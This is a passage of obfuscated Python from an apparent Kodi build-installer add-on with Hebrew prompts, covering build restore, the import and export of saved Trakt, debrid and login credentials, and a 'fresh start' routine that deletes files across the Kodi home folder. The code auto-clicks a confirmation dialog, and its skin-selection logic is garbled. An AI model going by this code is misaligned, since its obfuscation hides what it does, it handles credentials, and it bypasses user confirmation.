				wiz .cleanHouse (OO0O0OOOO000O0000 )#line:4520
				try :#line:4521
					shutil .rmtree (OO0O0OOOO000O0000 )#line:4522
				except :#line:4523
					wiz .log ("Error deleting: %s"%OO0O0OOOO000O0000 )#line:4524
			else :#line:4525
				wiz .log ('Addon data for %s was not removed'%O0OO00OOOOO0O0O00 )#line:4526
	wiz .refresh ()#line:4527
def restoreit (OOOOO0000O0OOO0O0 ):#line:4529
	if OOOOO0000O0OOO0O0 =='build':#line:4530
		O00O0OOOO0O0OOO00 =freshStart ('restore')#line:4531
		if O00O0OOOO0O0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4532
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4533
		wiz .skinToDefault ()#line:4534
	wiz .restoreLocal (OOOOO0000O0OOO0O0 )#line:4535
def restoreextit (OOOO0000000O00000 ):#line:4537
	if OOOO0000000O00000 =='build':#line:4538
		O00O0OO000OO0OO0O =freshStart ('restore')#line:4539
		if O00O0OO000OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4540
	wiz .restoreExternal (OOOO0000000O00000 )#line:4541
def buildInfo (OO0OO00OOO0O0OO0O ):#line:4543
	if wiz .workingURL (SPEEDFILE )==True :#line:4544
		if wiz .checkBuild (OO0OO00OOO0O0OO0O ,'url'):#line:4545
			OO0OO00OOO0O0OO0O ,OO0O0O000O000OO0O ,O00OO00000O0OOO0O ,OO000O00O00OO0000 ,OOO000OOO00000OO0 ,OOOO0O0OOO0OO0O00 ,O0OOO0OO00OO0OO0O ,O0OO0OO0O0O0OOOO0 ,OOO0OOO0OO0OOO0OO ,O0OO0O0O0OO0OOO0O ,OO0O00OO0OO0O00OO =wiz .checkBuild (OO0OO00OOO0O0OO0O ,'all')#line:4546
			O0OO0O0O0OO0OOO0O ='Yes'if O0OO0O0O0OO0OOO0O .lower ()=='yes'else 'No'#line:4547
			OO00O0OOO0OO0O00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OO00OOO0O0OO0O )#line:4548
			OO00O0OOO0OO0O00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0O000O000OO0O )#line:4549
			if not OOOO0O0OOO0OO0O00 =="http://":#line:4550
				OOO0OO0OO0000O0OO =wiz .themeCount (OO0OO00OOO0O0OO0O ,False )#line:4551
				OO00O0OOO0OO0O00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOO0OO0OO0000O0OO ))#line:4552
			OO00O0OOO0OO0O00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000OOO00000OO0 )#line:4553
			OO00O0OOO0OO0O00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0O0O0OO0OOO0O )#line:4554
			OO00O0OOO0OO0O00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00OO0OO0O00OO )#line:4555
			wiz .TextBox (ADDONTITLE ,OO00O0OOO0OO0O00O )#line:4556
		else :wiz .log ("Invalid Build Name!")#line:4557
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4558
def buildVideo (O0OO00O0O0OOOO0O0 ):#line:4560
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4561
	if wiz .workingURL (SPEEDFILE )==True :#line:4562
		OO00O000O00O0OO0O =wiz .checkBuild (O0OO00O0O0OOOO0O0 ,'preview')#line:4563
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0OO00O0O0OOOO0O0 )#line:4564
		if OO00O000O00O0OO0O and not OO00O000O00O0OO0O =='http://':playVideo (OO00O000O00O0OO0O )#line:4565
		else :wiz .log ("[%s]Unable to find url for video preview"%O0OO00O0O0OOOO0O0 )#line:4566
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4567
def dependsList (OOO0OOO0OO0OO0O0O ):#line:4569
	OO00OO0OOOOOOO000 =os .path .join (ADDONS ,OOO0OOO0OO0OO0O0O ,'addon.xml')#line:4570
	if os .path .exists (OO00OO0OOOOOOO000 ):#line:4571
		OO0OOOOOO0OOOO0O0 =open (OO00OO0OOOOOOO000 ,mode ='r');OOO00OOO000OO0O0O =OO0OOOOOO0OOOO0O0 .read ();OO0OOOOOO0OOOO0O0 .close ();#line:4572
		OO00OOO0OOO0OO0O0 =wiz .parseDOM (OOO00OOO000OO0O0O ,'import',ret ='addon')#line:4573
		O000OOO000O000O00 =[]#line:4574
		for OOOO000O000OOOO00 in OO00OOO0OOO0OO0O0 :#line:4575
			if not 'xbmc.python'in OOOO000O000OOOO00 :#line:4576
				O000OOO000O000O00 .append (OOOO000O000OOOO00 )#line:4577
		return O000OOO000O000O00 #line:4578
	return []#line:4579
def manageSaveData (OO0OO0OO00OOOO00O ):#line:4581
	if OO0OO0OO00OOOO00O =='import':#line:4582
		O0O0OOOO0OO00OOO0 =os .path .join (ADDONDATA ,'temp')#line:4583
		if not os .path .exists (O0O0OOOO0OO00OOO0 ):os .makedirs (O0O0OOOO0OO00OOO0 )#line:4584
		OO0OO00O00OO0O00O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4585
		if not OO0OO00O00OO0O00O .endswith ('.zip'):#line:4586
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4587
			return #line:4588
		OO00OO0O0000O0O00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4589
		O00000O0OOO0OOO00 =xbmcvfs .copy (OO0OO00O00OO0O00O ,OO00OO0O0000O0O00 )#line:4590
		wiz .log ("%s"%str (O00000O0OOO0OOO00 ))#line:4591
		extract .all (xbmc .translatePath (OO00OO0O0000O0O00 ),O0O0OOOO0OO00OOO0 )#line:4592
		OO00OO0OOO0OO0O00 =os .path .join (O0O0OOOO0OO00OOO0 ,'trakt')#line:4593
		O0O0OO00OO00OOO00 =os .path .join (O0O0OOOO0OO00OOO0 ,'login')#line:4594
		OOOO0O00OO0OOO0O0 =os .path .join (O0O0OOOO0OO00OOO0 ,'debrid')#line:4595
		OO00OOO0O0O0OOOO0 =0 #line:4596
		if os .path .exists (OO00OO0OOO0OO0O00 ):#line:4597
			OO00OOO0O0O0OOOO0 +=1 #line:4598
			O0O0OO000000O0O0O =os .listdir (OO00OO0OOO0OO0O00 )#line:4599
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4600
			for O000O00O000O0O0O0 in O0O0OO000000O0O0O :#line:4601
				O0O0000O0OOO0O0OO =os .path .join (traktit .TRAKTFOLD ,O000O00O000O0O0O0 )#line:4602
				OOO000000OOOOOO00 =os .path .join (OO00OO0OOO0OO0O00 ,O000O00O000O0O0O0 )#line:4603
				if os .path .exists (O0O0000O0OOO0O0OO ):#line:4604
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O00O000O0O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4605
					else :os .remove (O0O0000O0OOO0O0OO )#line:4606
				shutil .copy (OOO000000OOOOOO00 ,O0O0000O0OOO0O0OO )#line:4607
			traktit .importlist ('all')#line:4608
			traktit .traktIt ('restore','all')#line:4609
		if os .path .exists (O0O0OO00OO00OOO00 ):#line:4610
			OO00OOO0O0O0OOOO0 +=1 #line:4611
			O0O0OO000000O0O0O =os .listdir (O0O0OO00OO00OOO00 )#line:4612
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4613
			for O000O00O000O0O0O0 in O0O0OO000000O0O0O :#line:4614
				O0O0000O0OOO0O0OO =os .path .join (loginit .LOGINFOLD ,O000O00O000O0O0O0 )#line:4615
				OOO000000OOOOOO00 =os .path .join (O0O0OO00OO00OOO00 ,O000O00O000O0O0O0 )#line:4616
				if os .path .exists (O0O0000O0OOO0O0OO ):#line:4617
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O00O000O0O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4618
					else :os .remove (O0O0000O0OOO0O0OO )#line:4619
				shutil .copy (OOO000000OOOOOO00 ,O0O0000O0OOO0O0OO )#line:4620
			loginit .importlist ('all')#line:4621
			loginit .loginIt ('restore','all')#line:4622
		if os .path .exists (OOOO0O00OO0OOO0O0 ):#line:4623
			OO00OOO0O0O0OOOO0 +=1 #line:4624
			O0O0OO000000O0O0O =os .listdir (OOOO0O00OO0OOO0O0 )#line:4625
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4626
			for O000O00O000O0O0O0 in O0O0OO000000O0O0O :#line:4627
				O0O0000O0OOO0O0OO =os .path .join (debridit .REALFOLD ,O000O00O000O0O0O0 )#line:4628
				OOO000000OOOOOO00 =os .path .join (OOOO0O00OO0OOO0O0 ,O000O00O000O0O0O0 )#line:4629
				if os .path .exists (O0O0000O0OOO0O0OO ):#line:4630
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000O00O000O0O0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4631
					else :os .remove (O0O0000O0OOO0O0OO )#line:4632
				shutil .copy (OOO000000OOOOOO00 ,O0O0000O0OOO0O0OO )#line:4633
			debridit .importlist ('all')#line:4634
			debridit .debridIt ('restore','all')#line:4635
		wiz .cleanHouse (O0O0OOOO0OO00OOO0 )#line:4636
		wiz .removeFolder (O0O0OOOO0OO00OOO0 )#line:4637
		os .remove (OO00OO0O0000O0O00 )#line:4638
		if OO00OOO0O0O0OOOO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4639
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4640
	elif OO0OO0OO00OOOO00O =='export':#line:4641
		OOO0000OOOOO0OOOO =xbmc .translatePath (MYBUILDS )#line:4642
		OOO00OOOO0O0OO000 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4643
		traktit .traktIt ('update','all')#line:4644
		loginit .loginIt ('update','all')#line:4645
		debridit .debridIt ('update','all')#line:4646
		OO0OO00O00OO0O00O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4647
		OO0OO00O00OO0O00O =xbmc .translatePath (OO0OO00O00OO0O00O )#line:4648
		O0OOOO0O000O00O00 =os .path .join (OOO0000OOOOO0OOOO ,'SaveData.zip')#line:4649
		O00O00O0O0OO0OO0O =zipfile .ZipFile (O0OOOO0O000O00O00 ,mode ='w')#line:4650
		for O000OO00000OOOOOO in OOO00OOOO0O0OO000 :#line:4651
			if os .path .exists (O000OO00000OOOOOO ):#line:4652
				O0O0OO000000O0O0O =os .listdir (O000OO00000OOOOOO )#line:4653
				for OO0OOO0OOO000OO00 in O0O0OO000000O0O0O :#line:4654
					O00O00O0O0OO0OO0O .write (os .path .join (O000OO00000OOOOOO ,OO0OOO0OOO000OO00 ),os .path .join (O000OO00000OOOOOO ,OO0OOO0OOO000OO00 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4655
		O00O00O0O0OO0OO0O .close ()#line:4656
		if OO0OO00O00OO0O00O ==OOO0000OOOOO0OOOO :#line:4657
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0O000O00O00 ))#line:4658
		else :#line:4659
			try :#line:4660
				xbmcvfs .copy (O0OOOO0O000O00O00 ,os .path .join (OO0OO00O00OO0O00O ,'SaveData.zip'))#line:4661
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO0OO00O00OO0O00O ,'SaveData.zip')))#line:4662
			except :#line:4663
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0O000O00O00 ))#line:4664
def freshStart (install =None ,over =False ):#line:4669
	if USERNAME =='':#line:4670
		ADDON .openSettings ()#line:4671
		sys .exit ()#line:4672
	O0OO0OOO000O000OO =u_list (SPEEDFILE )#line:4673
	(O0OO0OOO000O000OO )#line:4674
	O00OOO000OOOOOO0O =(wiz .workingURL (O0OO0OOO000O000OO ))#line:4675
	(O00OOO000OOOOOO0O )#line:4676
	if KEEPTRAKT =='true':#line:4677
		traktit .autoUpdate ('all')#line:4678
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4679
	if KEEPREAL =='true':#line:4680
		debridit .autoUpdate ('all')#line:4681
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4682
	if KEEPLOGIN =='true':#line:4683
		loginit .autoUpdate ('all')#line:4684
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4685
	if over ==True :O00O00O000O000000 =1 #line:4686
	elif install =='restore':O00O00O000O000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4687
	elif install :O00O00O000O000000 =1 #line:4688
	else :O00O00O000O000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4689
	if O00O00O000O000000 :#line:4690
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4691
			O0O00O0000000OO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4692
			skinSwitch .swapSkins (O0O00O0000000OO0O )#line:4695
			O00O0O00OOOOOOOO0 =0 #line:4696
			xbmc .sleep (1000 )#line:4697
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O0O00OOOOOOOO0 <150 :#line:4698
				O00O0O00OOOOOOOO0 +=1 #line:4699
				xbmc .sleep (1000 )#line:4700
				wiz .ebi ('SendAction(Select)')#line:4701
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4702
				wiz .ebi ('SendClick(11)')#line:4703
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4704
			xbmc .sleep (1000 )#line:4705
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4706
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4707
			return #line:4708
		wiz .addonUpdates ('set')#line:4709
		O0OO000O0O0O00OOO =os .path .abspath (HOME )#line:4710
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4711
		OO0OOOOO0OO0000O0 =sum ([len (OOOOO0OO000OOOOOO )for O00O00OOOO000OOO0 ,OO00OOOOO00OO0000 ,OOOOO0OO000OOOOOO in os .walk (O0OO000O0O0O00OOO )]);O0000000O000O0000 =0 #line:4712
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4713
		EXCLUDES .append ('My_Builds')#line:4714
		EXCLUDES .append ('archive_cache')#line:4715
		EXCLUDES .append ('script.module.requests')#line:4716
		EXCLUDES .append ('myfav.anon')#line:4717
		if KEEPREPOS =='true':#line:4718
			OO0O0OO0O0OO0OOOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4719
			for OO00000O0O0O0O000 in OO0O0OO0O0OO0OOOO :#line:4720
				OOO0OO000O0OO0O00 =os .path .split (OO00000O0O0O0O000 [:-1 ])[1 ]#line:4721
				if not OOO0OO000O0OO0O00 ==EXCLUDES :#line:4722
					EXCLUDES .append (OOO0OO000O0OO0O00 )#line:4723
		if KEEPSUPER =='true':#line:4724
			EXCLUDES .append ('plugin.program.super.favourites')#line:4725
		if KEEPMOVIELIST =='true':#line:4726
			EXCLUDES .append ('plugin.video.metalliq')#line:4727
		if KEEPMOVIELIST =='true':#line:4728
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4729
		if KEEPADDONS =='true':#line:4730
			EXCLUDES .append ('addons')#line:4731
		if KEEPADDONS =='true':#line:4732
			EXCLUDES .append ('addon_data')#line:4733
		EXCLUDES .append ('plugin.video.elementum')#line:4736
		EXCLUDES .append ('script.elementum.burst')#line:4737
		EXCLUDES .append ('script.elementum.burst-master')#line:4738
		EXCLUDES .append ('plugin.video.quasar')#line:4739
		EXCLUDES .append ('script.quasar.burst')#line:4740
		EXCLUDES .append ('skin.estuary')#line:4741
		if KEEPWHITELIST =='true':#line:4744
			O0O00OOO0OO00O00O =''#line:4745
			O0O00O00OO00O000O =wiz .whiteList ('read')#line:4746
			if len (O0O00O00OO00O000O )>0 :#line:4747
				for OO00000O0O0O0O000 in O0O00O00OO00O000O :#line:4748
					try :OOO000O0OO00O0O00 ,OO0OOO0OO0O0OOOOO ,OOOOOOOOOO00O00OO =OO00000O0O0O0O000 #line:4749
					except :pass #line:4750
					if OOOOOOOOOO00O00OO .startswith ('pvr'):O0O00OOO0OO00O00O =OO0OOO0OO0O0OOOOO #line:4751
					OOOOOOOO0000000OO =dependsList (OOOOOOOOOO00O00OO )#line:4752
					for OO00O0OO00OO000O0 in OOOOOOOO0000000OO :#line:4753
						if not OO00O0OO00OO000O0 in EXCLUDES :#line:4754
							EXCLUDES .append (OO00O0OO00OO000O0 )#line:4755
						O0OO00O000O0O0O0O =dependsList (OO00O0OO00OO000O0 )#line:4756
						for O0O00O0OOOO000OO0 in O0OO00O000O0O0O0O :#line:4757
							if not O0O00O0OOOO000OO0 in EXCLUDES :#line:4758
								EXCLUDES .append (O0O00O0OOOO000OO0 )#line:4759
					if not OOOOOOOOOO00O00OO in EXCLUDES :#line:4760
						EXCLUDES .append (OOOOOOOOOO00O00OO )#line:4761
				if not O0O00OOO0OO00O00O =='':wiz .setS ('pvrclient',OOOOOOOOOO00O00OO )#line:4762
		if wiz .getS ('pvrclient')=='':#line:4763
			for OO00000O0O0O0O000 in EXCLUDES :#line:4764
				if OO00000O0O0O0O000 .startswith ('pvr'):#line:4765
					wiz .setS ('pvrclient',OO00000O0O0O0O000 )#line:4766
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4767
		O0O00O000000OO0O0 =wiz .latestDB ('Addons')#line:4768
		for OO0OO00OO0O0OOO0O ,OO0O0OOO0OOOO0O00 ,O0OOOOOO000O0O000 in os .walk (O0OO000O0O0O00OOO ,topdown =True ):#line:4769
			OO0O0OOO0OOOO0O00 [:]=[OO0O0O000OO0O0000 for OO0O0O000OO0O0000 in OO0O0OOO0OOOO0O00 if OO0O0O000OO0O0000 not in EXCLUDES ]#line:4770
			for OOO000O0OO00O0O00 in O0OOOOOO000O0O000 :#line:4771
				O0000000O000O0000 +=1 #line:4772
				OOOOOOOOOO00O00OO =OO0OO00OO0O0OOO0O .replace ('/','\\').split ('\\')#line:4773
				O00O0O00OOOOOOOO0 =len (OOOOOOOOOO00O00OO )-1 #line:4775
				if OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4776
				elif OOO000O0OO00O0O00 =='MyVideos99.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4777
				elif OOO000O0OO00O0O00 =='MyVideos107.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4778
				elif OOO000O0OO00O0O00 =='MyVideos116.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4779
				elif OOO000O0OO00O0O00 =='MyVideos99.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4780
				elif OOO000O0OO00O0O00 =='MyVideos107.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4781
				elif OOO000O0OO00O0O00 =='MyVideos116.db'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4782
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4783
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4784
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'skin.Premium.mod'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4785
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4786
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'skin.phenomenal'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4787
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4788
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'skin.titan'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4790
				elif OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4791
				elif OOO000O0OO00O0O00 =='sources.xml'and OOOOOOOOOO00O00OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4793
				elif OOO000O0OO00O0O00 =='quicknav.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4796
				elif OOO000O0OO00O0O00 =='x1101.DATA.xml'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -2 ]=='userdata'and OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOOOOOOOO00O00OO [O00O0O00OOOOOOOO0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0OO00OO0O0OOO0O ,OOO000O0OO00O0O00 ),xbmc .LOGNOTICE )#line:4797
